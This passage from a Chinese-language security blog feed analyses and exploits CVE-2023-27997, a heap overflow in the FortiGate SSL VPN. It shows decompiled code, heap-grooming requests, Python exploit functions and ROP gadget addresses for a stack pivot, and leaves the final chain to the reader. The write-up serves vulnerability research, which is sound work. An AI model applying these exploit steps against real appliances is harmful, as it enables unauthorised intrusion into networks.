class="built_in">strlen</span>(in);                              <span class="comment">// in (enc) : AA BB CC DD  XX XX HACKED HACKED ...</span></span><br><span class="line">                                                <span class="comment">//               SEED      SIZE     CIPHERTEXT</span></span><br><span class="line">  int_len = v4;</span><br><span class="line">  lenOfData = v4;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)v4 &lt;= <span class="number">11</span> || (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )         <span class="comment">// enc 的长度要大于11, 且偶数</span></span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先进到函数里， 会先判断 <code>enc</code> 参数的值是否长度大于11, 且偶数 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MD5Data(salt, (__int64)in, <span class="number">8</span>, (__int64)md5);</span><br><span class="line">out = (__int16 *)alignedAlloc(*pool, (int_len &gt;&gt; <span class="number">1</span>) + <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>当符合要求后， 会以长度的 1/2 的大小分配一个 buffer , 然后中间会经过一些数据处理，然后到达另外一个 check</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">out = decodedData_ + <span class="number">2</span>;</span><br><span class="line">xored_given_len = decodedData_[<span class="number">2</span>];</span><br><span class="line">given_len = (<span class="keyword">unsigned</span> __int8)(xored_given_len ^ md5[<span class="number">0</span>]);</span><br><span class="line">BYTE1(given_len) = md5[<span class="number">1</span>] ^ HIBYTE(xored_given_len);</span><br><span class="line">payloadLength = (<span class="keyword">unsigned</span> __int8)(xored_given_len ^ md5[<span class="number">0</span>]);<span class="comment">// 检查大小</span></span><br><span class="line"><span class="keyword">if</span> ( int_len - <span class="number">5</span> &lt;= payloadLength )</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v17 = decodedData_ + <span class="number">3</span>;</span><br><span class="line">  out = v17;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)xored_given_len != md5[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(payloadLength - <span class="number">1</span>);</span><br><span class="line">    i = <span class="number">0LL</span>;</span><br><span class="line">    v20 = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)v17 + i) ^= md5[v20];    <span class="comment">// bof</span></span><br><span class="line">      <span class="keyword">if</span> ( v18 == i )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v20 = ((_BYTE)i + <span class="number">3</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (((_BYTE)i + <span class="number">3</span>) &amp; <span class="number">0xF</span>) == <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">      v17 = out;</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = (__int16 *)((<span class="keyword">char</span> *)out + (<span class="keyword">unsigned</span> __int16)given_len);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里会将数据的长度（实际传入的长度 ） 和 <code>enc</code> 这个参数定义的 payload 的长度比较， 如果符合  <code>int_len - 5 &lt;= payloadLength</code> ， 即实际长度大于定义的长度， 即接着往下走。 注意这里会出现一个安全问题：</p><p>因为实际分配的buffer 的长度应该是实际长度的 1/2 ，而这里却是用原来的长度比较的，因此后面会发生溢出。但是这里的溢出的字节是一个 md5 异或, 这里会对我们后面的利用提出一点点的难度,但是作者却用了一个很巧妙的来完成 。</p><p>这里简单总结下这个函数和提炼下 <code>enc</code> 的结构, 首先 <code>enc</code> 参数是一个包含 seed、size（2 个字节）和数据的结构。大小和数据都是加密的。 大致就下图的样子.</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-f56028c12c14f7a25eea4f193cd88886-95ed7a.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-f56028c12c14f7a25eea4f193cd88886-95ed7a.png" alt="image.png"></a></p><p>seed 存储为 8 个十六进制字符，用于计算 XOR 密钥流的第一个状态：</p><p><code>S0 = MD5(salt|seed| &quot;GCC is the GNU Compiler Collection.&quot;)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MD5Data</span><span class="params">(<span class="keyword">char</span> *salt, __int64 enc, <span class="keyword">int</span> size, __int64 output)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">MD5_Init</span><span class="params">(v8)</span></span>;</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(salt);</span><br><span class="line">  MD5_Update(v8, salt, v6);</span><br><span class="line">  MD5_Update(v8, enc, size);</span><br><span class="line">  MD5_Update(v8, <span class="string">&quot;GCC is the GNU Compiler Collection.&quot;</span>, <span class="number">35LL</span>);</span><br><span class="line">  MD5_Final(output, v8);</span><br><span class="line">  <span class="keyword">return</span> v9 - __readfsqword(<span class="number">0</span>x</span><br></pre></td></tr></table></figure><p>这里的 <code>salt</code> 是由服务器创建的随机值, 可以通过 <code>GET /remote/info HTTP/1.1</code> 获取到 </p><p>密钥流的其他状态计算如下：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ba186e829988f5da44acd8c00a454950-121174.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ba186e829988f5da44acd8c00a454950-121174.png" alt="image.png"></a><br>函数行为:</p><ol><li>计算 MD5（16 字节），这是来自盐和种子的密钥的第一个状态（in 的前 8 个字符）</li><li>分配大小为 in_len / 2 + 1、out 和十六进制解码输入的缓冲区</li><li>通过将有效负载的前两个字节与密钥的前两个字节进行异或运算，计算用户给定的长度 given_len</li><li>边界检查：验证给定的长度不大于缓冲区的大小</li><li>就地解密整个字符串：对前 14 个字节进行 XOR，然后计算一个新状态 𝐾 1个 ，用它对接下来的 16 个字节进行异或，然后重复。</li><li>在解密数据的末尾放置一个 NULL 字节</li><li>当程序检查给定长度不大于发送的有效负载的长度时，它会将 in_len 与 given_len 进行比较。但是，前者以十六进制描述有效负载的长度（例如“41424343”），而后者以原始字节描述其大小（例如“ABCD”）。因此，given_len 可以是它应该的两倍大。因此造成了溢出</li></ol><blockquote><p>这里稍微吐槽一下， IDA 的反编译错误导致很多文章对该漏洞的产生原因的描述有些错误</p><p><a href="https://twitter.com/bestswngs/status/1670709186509045761">wrong results of Hex-Rays</a></p></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="利用原语"><a href="#利用原语" class="headerlink" title="利用原语"></a>利用原语</h3><p>首先第一个问题是我们最终选择了  <code>/remote/hostcheck_validate</code>   来做漏洞的触发, 由于漏洞利用原因需要多次请求, 我们如果使用了 <code>/remote/logincheck</code>  容易触发 <code>login-attempt-limit</code> 的限制, 这个默认限制为 2</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-3c579214a9d839b632cc6a248fc70f20-30b511.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-3c579214a9d839b632cc6a248fc70f20-30b511.png" alt="image.png"></a></p><p>接着就是利用原语的问题, 这里直接采用了作者提供的方法 ^[2]</p><p>大致的核心原理就是使用两次异或, 这样就不会让前面的数值发生混乱.</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-96cdc2cf4791a8f7e3aae65753ebd0d8-e97ee9.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-96cdc2cf4791a8f7e3aae65753ebd0d8-e97ee9.png" alt="image.png"></a></p><p>假设我们要修改 5000偏移的值为 0xff , . 那么我们要溢出两次, 第一次将长度设置为 4999 , 此时溢出结束后会将 5000 位置的值写成 0 , 紧接着第二次用我们计算好的 seed  通过 <code>0xff ^ 0 </code>的方式 , 将5000位置设置成 0xff </p><p>按照作者说明就是：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4e0284df44bd40b0e419b74bfced6499-4446fa.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4e0284df44bd40b0e419b74bfced6499-4446fa.png" alt="image.png"></a></p><h3 id="堆布局"><a href="#堆布局" class="headerlink" title="堆布局"></a>堆布局</h3><p>我们的目标是去溢出覆盖 SSL 结构中的 <code>handshake_func</code> 指针， 这利用是参考的 orange 当时的一个博客 ^[3]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SSL_do_handshake</span><span class="params">(SSL *s)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">     s-&gt;method-&gt;ssl_renegotiate_check(s, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (SSL_in_init(s) || SSL_in_before(s)) &#123;</span><br><span class="line">         <span class="keyword">if</span> ((s-&gt;mode &amp; SSL_MODE_ASYNC) &amp;&amp; ASYNC_get_current_job() == <span class="literal">NULL</span>) &#123;</span><br><span class="line">             <span class="class"><span class="keyword">struct</span> <span class="title">ssl_async_args</span> <span class="title">args</span>;</span></span><br><span class="line"></span><br><span class="line">             args.s = s;</span><br><span class="line"></span><br><span class="line">             ret = ssl_start_async_job(s, &amp;args, ssl_do_handshake_intern);</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             ret = s-&gt;handshake_func(s);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> ret;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>SSL 结构体如下 ^[4]:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ssl_st</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * protocol version (one of SSL2_VERSION, SSL3_VERSION, TLS1_VERSION,</span></span><br><span class="line"><span class="comment">     * DTLS1_VERSION)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">int</span> version;</span><br><span class="line">    <span class="comment">/* SSLv3 */</span></span><br><span class="line">    <span class="keyword">const</span> SSL_METHOD *method;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * There are 2 BIO&#x27;s even though they are normally both the same.  This</span></span><br><span class="line"><span class="comment">     * is so data can be read and written to different handlers</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/* used by SSL_read */</span></span><br><span class="line">    BIO *rbio;</span><br><span class="line">    <span class="comment">/* used by SSL_write */</span></span><br><span class="line">    BIO *wbio;</span><br><span class="line">    <span class="comment">/* used during session-id reuse to concatenate messages */</span></span><br><span class="line">    BIO *bbio;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This holds a variable that indicates what we were doing when a 0 or -1</span></span><br><span class="line"><span class="comment">     * is returned.  This is needed for non-blocking IO so we know what</span></span><br><span class="line"><span class="comment">     * request needs re-doing when in SSL_accept or SSL_connect</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">int</span> rwstate;</span><br><span class="line">    <span class="keyword">int</span> (*handshake_func) (SSL *);</span><br></pre></td></tr></table></figure><p>那这的问题就是转化为， 我们如何稳定的将 <code>out</code> 这个缓冲区放置在  SSL 结构体的缓冲区前面， 这样溢出的时候我们才能覆盖到。这里我们参考了部分作者的思路， 在我们这个测试版本中，  SSL 结构的大小为 0x1db8 字节， 他将分配在 0x2000  的缓冲区内 。 另外提一句这里的堆分配器用的是 jemalloc  ， 符合一些后进先出的规则，因此我们的最终思路大概就是：</p><p>我们用了 gdb 设置当前 PC 为 <code>je_malloc_stats_print</code> 函数地址，打印当前 <code>jemalloc</code> 的分配情况</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d1f8e940e7046fe389e9ecf78392c333-9e4181.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d1f8e940e7046fe389e9ecf78392c333-9e4181.png" alt="image.png"></a></p><p>可以发现默认情况下 <code>0x2000</code> 这么的大的内存是不会怎么使用到的， 因此我们只需要先分配几次 （这里使用 10 次 ）分配0x2000 的 buffer，然后释放掉让这连续的内存进入到链表里，方便后面利用的时候让 out 的缓冲区在 ssl 结构体前面。这里的分配原理是通过一个请求给一个解析POST参数的网页 ， 在这个请求中，发送了POST key-value对， 其中sizeof(key) = sizeof(struct_ssl) - 0x18 - 0x10 而sizeof(value)=0 ， 例如我们发送一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;remote&#x2F;hostcheck_validate HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">A*(sizeof(struct_ssl) - 0x18 - 0x10)&#x3D;&amp;</span><br></pre></td></tr></table></figure><p>这样理想情况下会分分配一个如下的内存：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ce0846e872e41e303b2eca5ef364df90-704e11.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-ce0846e872e41e303b2eca5ef364df90-704e11.png" alt="image.png"></a></p><p>有三个 <code>AAAA</code> 的内存原因是在解析POST数据的时候，程序会这么做：拿到整个POSTDATA缓冲区（例如a=b&amp;c=d&amp;e=f），然后提取出’&amp;’之前的内容，并把它存储在一个新的块里（那是1个分配）。然后，拿到’=’之前的内容，并把它存储在一个新的块里（两个分配）。然后，它将键和值存储在一个全局哈希映射中，这会导致产生第三个分配</p><p>这里为了方便观察分配的情况， 我们还可以用到 gdb 的commands 和 logging 功能。大致就是在 <code>je_malloc</code> 分配结束后下断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;.text:0000000001776C85 E8 D6 5A CC+                call    _je_malloc</span><br><span class="line">&#x2F;&#x2F;.text:0000000001776C8A 49 89 C4                    mov     r12, rax</span><br><span class="line">break *0x1776C8A </span><br><span class="line">commands 1</span><br><span class="line">set logging file ssl_chunk.txt</span><br><span class="line">set logging enable on</span><br><span class="line">p&#x2F;x $rax</span><br><span class="line">set logging enable off</span><br><span class="line">continue</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>我们尽量让其分配的时候是连续的内存：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-bc72ef0094686857032b3a9e058315e3-c9a332.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-bc72ef0094686857032b3a9e058315e3-c9a332.png" alt="image.png"></a></p><p>当然在实际环境中可能有其他的干扰，因此我们可以多分配几次 ，例如我上个版本的利用是分配了 <code>301</code> 次， 然后在这几个 sock 都close掉让其释放。我这部分代码如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">heap_layout</span>(<span class="params">IP, port</span>):</span></span><br><span class="line">    <span class="comment"># heap layout</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.printable[:<span class="number">10</span>]:</span><br><span class="line">        payload += i*(size) + <span class="string">&#x27;=&amp;&#x27;</span></span><br><span class="line"></span><br><span class="line">    sock = make_ssl_socket(IP, port, if_warp=<span class="literal">True</span>)</span><br><span class="line">    sock = set_heap_fengshui(sock, payload)</span><br><span class="line">    sock.close()</span><br></pre></td></tr></table></figure><p>这样之后，我们需要创建两个 sock  ， 代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_rewrtie_ssl_struct</span>(<span class="params">IP, port, salt, seeds</span>):</span></span><br><span class="line">    log.info(<span class="string">&#x27;Creating sockets...&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    vul_sock = make_ssl_socket(IP, port, if_warp=<span class="literal">True</span>)</span><br><span class="line">    sock4 = make_ssl_socket(IP, port)</span><br><span class="line">    sock4.sendall(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&#x27;Rewrite SSL struct&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> seed <span class="keyword">in</span> seeds:</span><br><span class="line">        <span class="keyword">for</span> offset <span class="keyword">in</span> seed:</span><br><span class="line">            write_value(vul_sock, salt, seed[offset].decode(<span class="string">&#x27;latin1&#x27;</span>), offset)</span><br><span class="line">    <span class="keyword">return</span> (vul_sock, sock4)</span><br></pre></td></tr></table></figure><p>其中一个 <code>vul_sock</code> 是用来溢出 buffer ， 然后 sock4 是用来分配 ssl 结构体， 用来被溢出的。 这样之后我们就能稳定触发溢出，且稳定的让 ssl 结构体分配在 out 的缓冲区后面<br>。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-a4930365eb0a53489ff736eff83e0c9e-f36a67.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-a4930365eb0a53489ff736eff83e0c9e-f36a67.png" alt="image.png"></a></p><h3 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h3><p>当触发溢出的时候， 我们的这个时候指针和内存大概如下：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4994090cd5a6c71e1d1c02b3a843fe13-a5245c.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-4994090cd5a6c71e1d1c02b3a843fe13-a5245c.png" alt="image.png"></a></p><p>我们可以发现，当我们控制 PC  后， 这里的 <code>RDI</code> 寄存器指向的是我们的 ssl 结构体， 因此第一个涌上的思路是做栈迁移， 找一个类似于</p><p><code>push rdi; pop rsp; ... ; ret </code> 的 gadget 即可， 我们最后使用的是 <code>push_rdi_pop_rsp = 0x669129 # push rdi ; pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</code></p><p>这样就将栈成功迁移到了我们的 ssl stuct ， 即可控的可写的缓冲区内。 然后这里预期直接在 ssl 缓冲区接着写我们剩下的 <code>gadget</code> ， 但是这里突然发现了一个问题， ssl struct 似乎有很多结构体不能被写， 一写就报错 。</p><p>于是我在这里换了个思路， 接着尝试布局堆结构，理想情况应该是：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-feac6e93867e3afd30cd73f00de7c7f0-2031ee.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-feac6e93867e3afd30cd73f00de7c7f0-2031ee.png" alt="image.png"></a></p><p>或者</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8af32ae43ee156ed62aff6c50e7ba555-cc0cbe.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-8af32ae43ee156ed62aff6c50e7ba555-cc0cbe.png" alt="image.png"></a></p><p>在 out 前面 ， 或者 ssl struct 的后面布局一块完全可控的内存， 但是由于我们的这块完全可控的内存是不能被 00 截断的， 因此key-value 对的  key 似乎是不能用来布局的，但是这里我想了下， key 不能被用来布局堆， 但是 value 应该是可以的！！ 因此我在溢出结束之后， 接着尝试用如下代码发包：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">layout_gadget</span>(<span class="params">IP, port</span>):</span></span><br><span class="line">    ropchain = build_ropchain(args)</span><br><span class="line">    sock = make_ssl_socket(IP, port, if_warp=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        junk = cyclic(size, n=<span class="number">8</span>)</span><br><span class="line">        pay = <span class="built_in">bytearray</span>(junk)</span><br><span class="line">        <span class="comment">#pay[1: 1+13 * 8] = p64(ret) * 13</span></span><br><span class="line">        <span class="comment">#pay[105:105+len(ropchain)]  = ropchain</span></span><br><span class="line">        junk = <span class="built_in">bytes</span>(pay)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;aaaa&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk + <span class="string">&#x27;&amp;&#x27;</span> + <span class="string">&#x27;bbbb&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk + <span class="string">&#x27;&amp;&#x27;</span> + <span class="string">&#x27;cccc&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk + <span class="string">&#x27;&amp;&#x27;</span> + <span class="string">&#x27;dddd&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk + <span class="string">&#x27;&amp;&#x27;</span> + <span class="string">&#x27;eeee&#x27;</span> + <span class="string">&#x27;=&#x27;</span> + junk </span><br><span class="line">        payload += <span class="string">&#x27;&amp;username=vvvv&#x27;</span></span><br><span class="line">        sock = set_heap_fengshui(sock, payload)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> sock</span><br></pre></td></tr></table></figure><p>成功在 out 缓冲区写下了一块可控的内存</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d9a69e8ee03dbce4df4a250e873625d0-092293.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-d9a69e8ee03dbce4df4a250e873625d0-092293.png" alt="image.png"></a></p><p>因此此时内存结构如下：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-b44f04c102f10f092eb78af81e384f08-6327ef.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-19-b44f04c102f10f092eb78af81e384f08-6327ef.png" alt="image.png"></a></p><p>由于 ssl struct 有很多不能写的地方， 于是我想到一个方法， 尝试去找大量连续是 0 的缓冲区， 然后仅仅写入另外一段 stack pivot chain，将栈迁移到前面的可控缓冲区中 。最后我使用了这样的 chain ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x000000000060bdb4   # pop rax ; pop rdx ; ret</span><br><span class="line">bss_addr &#x3D; 0x4698eb0 # -&gt; rax</span><br><span class="line">offfset &#x3D;  0x26e0-1  # rdx -&gt; ropchain</span><br><span class="line">0x61a292  # : sub rsp, rdx ; dec dword ptr [rax - 0x77] ; ret</span><br></pre></td></tr></table></figure><p>通过这条 chain， 将栈迁移到前面的缓冲区， 进行更复杂的操作。</p><h3 id="执行任意指令"><a href="#执行任意指令" class="headerlink" title="执行任意指令"></a>执行任意指令</h3><p>在完成此部分之后，接下来就是组装ROP链的过程了。尽管该程序非常庞大，以至于几乎可以找到所需的任何gadget链，但找寻gadget终究是一个相对繁琐的任务。因此，最后决定采用mprotect + shellcode的方法。首先，利用一些gadget将rdi指向ROP链的内存开头。</p><p>这一部分内容就留作给读者完成吧</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><blockquote class="twitter-tweet"><p lang="en" dir="ltr">I learned a lot from <a href="https://twitter.com/cfreal_?ref_src=twsrc%5Etfw">@cfreal_</a> , and it&#39;s great to write exploits together with <a href="https://twitter.com/leommxj?ref_src=twsrc%5Etfw">@leommxj</a>.<a href="https://twitter.com/hashtag/CVE?src=hash&amp;ref_src=twsrc%5Etfw">#CVE</a>-2023-27997 <a href="https://t.co/nEFndgvoVD">pic.twitter.com/nEFndgvoVD</a></p>&mdash; swing (@bestswngs) <a href="https://twitter.com/bestswngs/status/1669969165392953344?ref_src=twsrc%5Etfw">June 17, 2023</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><p>^[1]   <a href="https://labs.watchtowr.com/xortigate-or-cve-2023-27997/">https://labs.watchtowr.com/xortigate-or-cve-2023-27997/</a><br>^[2]  <a href="https://blog.lexfo.fr/xortigate-cve-2023-27997.html">https://blog.lexfo.fr/xortigate-cve-2023-27997.html</a><br>^[3] <a href="https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/#:~:text=The%20crash%20happened%20in">attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn</a><br>^[4] <a href="https://github.dev/openssl/openssl/tree/openssl-3.0.0">https://github.dev/openssl/openssl/tree/openssl-3.0.0</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
    <summary type="html">CVE-2023-27997</summary>
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="CVE-2023-27997" scheme="https://bestwing.me/tags/CVE-2023-27997/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow</title>
    <link href="https://bestwing.me/CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow.html"/>
    <id>https://bestwing.me/CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow.html</id>
    <published>2023-06-17T16:00:00.000Z</published>
    <updated>2023-06-28T10:20:57.000Z</updated>
    
